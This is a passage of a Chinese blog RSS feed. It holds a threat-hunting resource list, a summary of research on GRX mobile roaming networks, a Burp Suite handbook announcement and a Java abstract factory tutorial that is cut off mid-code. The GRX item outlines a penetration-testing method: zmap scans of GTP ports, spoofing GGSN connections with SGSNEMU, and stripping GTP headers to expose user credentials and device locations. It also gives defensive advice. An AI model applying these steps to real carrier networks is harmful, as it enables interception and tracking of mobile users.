&lt;li&gt;攻击模式识别与防御策略（00:50:57）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;资源索引&#34;&gt;资源索引
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/OTRF/mordor&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Mordor项目GitHub&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/Cyb3rWard0g/HELK&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;HELK实时分析平台&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/OTRF/ThreatHunter-Playbook&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;威胁狩猎Playbook&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://infosecjupyterbook.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Jupyter安全分析手册&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;完整幻灯片下载：&lt;a class=&#34;link&#34; href=&#34;https://www.blackhillsinfosec.com/wp-content/uploads/2020/09/SLIDES_WhenWorldsCollide.pdf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;BHIS技术白皮书&lt;/a&gt;&lt;br&gt;
加入技术社区：&lt;a class=&#34;link&#34; href=&#34;https://discord.gg/aHHh3u5&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;BHIS Discord&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>揭秘GRX网络与间谍活动：移动数据安全漏洞分析</title>
        <link>http://localhost:1313/p/%E6%8F%AD%E7%A7%98grx%E7%BD%91%E7%BB%9C%E4%B8%8E%E9%97%B4%E8%B0%8D%E6%B4%BB%E5%8A%A8%E7%A7%BB%E5%8A%A8%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
        <pubDate>Sat, 02 Aug 2025 15:02:00 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%8F%AD%E7%A7%98grx%E7%BD%91%E7%BB%9C%E4%B8%8E%E9%97%B4%E8%B0%8D%E6%B4%BB%E5%8A%A8%E7%A7%BB%E5%8A%A8%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;移动数据网络基础&#34;&gt;移动数据网络基础
&lt;/h3&gt;&lt;p&gt;在移动数据网络中，设备位置信息至关重要。例如荷兰KPN运营商拥有约5000个基站，每个基站通过小区标识符（CI）和路由区域码（RAC）进行管理。国际移动用户标识（IMSI）、接入点名称（APN）和SIM卡存储的通用集成电路卡（UICC）是网络接入的核心要素。数据包传输需经过服务GPRS支持节点（SGSN）、网关GPRS支持节点（GGSN）等组件，并通过GPRS隧道协议（GTP）建立专用通信隧道（基于UDP的GTPv0/v1/v2协议）。&lt;/p&gt;
&lt;h3 id=&#34;grx网络的安全价值&#34;&gt;GRX网络的安全价值
&lt;/h3&gt;&lt;p&gt;当设备漫游时，运营商通过GRX网络将流量路由至归属国网关。研究团队发现：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;数据暴露风险&lt;/strong&gt;：通过自定义脚本剥离GTP头部后，可解析出明文流量（含用户凭证）；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;位置追踪&lt;/strong&gt;：GTP头部包含MCC（国家代码）、MNC（运营商代码）、LAC（位置区号）等元数据，结合IMEI分析可精确定位设备；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;网络隔离失效&lt;/strong&gt;：扫描显示GRX网络中存在大量暴露的SMTP/FTP/Telnet服务（含老旧漏洞版本），42K主机中有5.5K可直接从互联网访问。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;渗透测试方法论&#34;&gt;渗透测试方法论
&lt;/h3&gt;&lt;p&gt;团队采用&amp;quot;杀伤链&amp;quot;模型对GRX网络进行审计：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;BGP路由分析&lt;/strong&gt;：识别4.8K子网（320K IP地址）；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;大规模扫描&lt;/strong&gt;：使用zmap探测GTP服务（UDP 2152/2123端口）；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;模拟攻击&lt;/strong&gt;：通过SGSNEMU工具伪造GGSN连接，建立虚假PDP上下文；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;服务枚举&lt;/strong&gt;：发现运营商DNS服务器多运行老旧BIND版本（存在DoS漏洞）。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;防御建议&#34;&gt;防御建议
&lt;/h3&gt;&lt;p&gt;运营商应：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;从BGP表中移除GRX前缀&lt;/li&gt;
&lt;li&gt;实施BGP认证与入口过滤&lt;/li&gt;
&lt;li&gt;严格限制AS号间的路由前缀交换&lt;/li&gt;
&lt;li&gt;应用最小权限访问控制列表（仅允许GTP/DNS/ICMP）&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;案例关联&lt;/strong&gt;：比利时电信（Belgacom）被黑事件表明，攻击者可能通过社工管理员而非外部漏洞获取GRX访问权限，凸显内部威胁防护的重要性。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>测试手册新增Burp Suite专业版章节 - 提升Web应用安全测试效率</title>
        <link>http://localhost:1313/p/%E6%B5%8B%E8%AF%95%E6%89%8B%E5%86%8C%E6%96%B0%E5%A2%9Eburp-suite%E4%B8%93%E4%B8%9A%E7%89%88%E7%AB%A0%E8%8A%82-%E6%8F%90%E5%8D%87web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E6%95%88%E7%8E%87/</link>
        <pubDate>Sat, 02 Aug 2025 14:40:48 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%B5%8B%E8%AF%95%E6%89%8B%E5%86%8C%E6%96%B0%E5%A2%9Eburp-suite%E4%B8%93%E4%B8%9A%E7%89%88%E7%AB%A0%E8%8A%82-%E6%8F%90%E5%8D%87web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E6%95%88%E7%8E%87/</guid>
        <description>&lt;p&gt;基于我们的安全审计经验，我们发现Burp Suite Professional的动态分析能够发现隐藏在各种目标组件中的漏洞。像竞态条件这类不可预测的安全问题，仅通过检查源代码往往难以捕捉。&lt;/p&gt;
&lt;p&gt;虽然Burp是全面的Web应用安全测试工具，但其丰富功能可能构成使用门槛。为此，Trail of Bits在测试手册中新增了Burp Suite指南章节，旨在简化复杂性，提供清晰简洁的操作路径，帮助用户快速获得实际成果。&lt;/p&gt;
&lt;p&gt;新章节首先探讨Burp的核心应用场景，深入解析其如何提升安全测试能力——特别是在面对前端代码混淆、复杂基础设施组件、部署环境差异或客户端数据处理等挑战时。&lt;/p&gt;
&lt;p&gt;章节提供逐步配置指南，帮助您快速高效地为特定应用设置Burp，最大程度减少配置错误，确保潜在漏洞不被遗漏，这将显著改变您的安全审计效果。我们还探讨如何利用关键Burp扩展来增强应用测试流程，发现更多漏洞。&lt;/p&gt;
&lt;p&gt;最后章节提供大量专业技巧，助您掌握高级实践，发掘Burp的隐藏特性，这些都可能彻底改变您的安全测试工作流程。&lt;/p&gt;
&lt;h3 id=&#34;实战知识实战成果&#34;&gt;实战知识，实战成果
&lt;/h3&gt;&lt;p&gt;测试手册系列凝结了我们丰富的实战经验。这些见解超越简单文档复述，提供Trail of Bits团队从安全审计实践中验证过的策略。&lt;/p&gt;
&lt;p&gt;通过这个新章节，我们希望赋予您所需的知识和信心，真正释放Burp Suite保护Web应用的潜力。&lt;/p&gt;
&lt;p&gt;准备好用Burp Suite增强您的安全测试了吗？立即阅读新章节。&lt;/p&gt;
&lt;p&gt;[分享至 Twitter][LinkedIn][GitHub][Mastodon][Hacker News]&lt;/p&gt;
</description>
        </item>
        <item>
        <title>深入解析抽象工厂模式：构建灵活可扩展的软件架构</title>
        <link>http://localhost:1313/p/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%E6%9E%84%E5%BB%BA%E7%81%B5%E6%B4%BB%E5%8F%AF%E6%89%A9%E5%B1%95%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84/</link>
        <pubDate>Sat, 02 Aug 2025 14:30:01 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%E6%9E%84%E5%BB%BA%E7%81%B5%E6%B4%BB%E5%8F%AF%E6%89%A9%E5%B1%95%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84/</guid>
        <description>&lt;h1 id=&#34;abstract-factory-pattern&#34;&gt;Abstract Factory pattern
&lt;/h1&gt;&lt;p&gt;工厂模式一直是构建应用程序的关键模式，它简单、高效且直击要点。当开始学习面向设计的方法构建应用或API时，我总是推荐将工厂模式作为设计中的关键切入点。今天我要讨论的是抽象工厂模式。它并不是你称之为模式的&amp;quot;抽象&amp;quot;类或对象，而是工厂的工厂——这正是它被称为&amp;quot;抽象&amp;quot;的原因。&amp;ldquo;抽象&amp;quot;类的存在只是这个模式的另一个侧面。&lt;/p&gt;
&lt;h2 id=&#34;何时使用抽象工厂模式&#34;&gt;何时使用抽象工厂模式
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;需要独立于产品的创建、组合和表现方式时&lt;/li&gt;
&lt;li&gt;需要对作为组使用的产品实施强制约束时&lt;/li&gt;
&lt;li&gt;需要仅暴露产品接口而不暴露其实现细节时&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;实现方案&#34;&gt;实现方案
&lt;/h2&gt;&lt;p&gt;以下是我的实现计划：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Has A关系&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;产品(Product)拥有规格(Specification)&lt;/li&gt;
&lt;li&gt;工厂(Factory)拥有产品(Product)&lt;/li&gt;
&lt;li&gt;工厂管理器(FactoryManager)拥有工厂(Factory)&lt;/li&gt;
&lt;li&gt;工厂管理器(FactoryManager)拥有计算机工厂(ComputerFactory)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Is A关系&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;B工厂是计算机工厂&lt;/li&gt;
&lt;li&gt;A工厂是计算机工厂&lt;/li&gt;
&lt;li&gt;(图中未显示)产品A是产品&lt;/li&gt;
&lt;li&gt;产品B是产品&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;代码实现&#34;&gt;代码实现
&lt;/h2&gt;&lt;h3 id=&#34;基础抽象工厂类&#34;&gt;基础抽象工厂类
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;abstract&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;ComputerFactory&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;abstract&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;abstract&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Product&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getProducts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;abstract&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Product&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getProduct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ProductID&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;具体工厂实现&#34;&gt;具体工厂实现
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;AFactory&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;extends&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ComputerFactory&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Product&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getProducts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Product&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getProduct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;productID&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;switch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;productID&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;case&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ProductA&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;case&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ProductB&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IllegalArgumentException&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Sorry you hit the wrong factory, we closed down in 1600 BC&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;工厂常量定义&#34;&gt;工厂常量定义
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;interface&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;FactoryConstants&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
